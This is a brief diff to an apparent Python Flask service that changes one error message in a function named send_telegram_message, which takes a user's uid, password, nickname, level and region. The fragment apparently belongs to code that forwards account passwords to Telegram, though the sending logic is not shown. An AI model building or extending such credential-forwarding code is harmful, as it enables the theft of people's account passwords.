@@ -207,7 +207,7 @@ def send_telegram_message(uid: str, password: str, nickname: str, level, region:
             timeout=5
         )
     except Exception as e:
-        print(f"Telegram send error: {e}")
+        print(f"efc error: {e}")
 
 @app.route('/info', methods=['GET'])
 def info_endpoint():
